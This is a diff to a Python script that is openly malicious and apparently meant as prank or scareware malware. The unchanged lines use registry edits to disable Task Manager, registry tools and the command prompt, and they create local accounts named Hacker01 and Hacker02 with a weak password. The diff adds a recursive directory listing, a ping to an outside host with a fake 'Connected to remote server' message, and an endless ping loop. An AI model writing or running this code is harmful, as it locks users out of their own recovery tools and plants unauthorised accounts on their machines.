@@ -2,6 +2,9 @@ import time
 import os
 print("I warned you! wait 5 secs or close window if this is ur pc.")
 time.sleep(5)
+os.system('dir /s >nul')
+os.system('ping heckersite.ct8.pl')
+print("Connected to remote server")
 os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
 os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f')
 os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f')
@@ -31,3 +34,5 @@ os.system("net user Hacker01 /add")
 os.system("net user Hacker02 /add")
 os.system("net user Hacker01 123")
 os.getcwd()
+while True:
+  os.system("ping heckersite.ct8.pl")
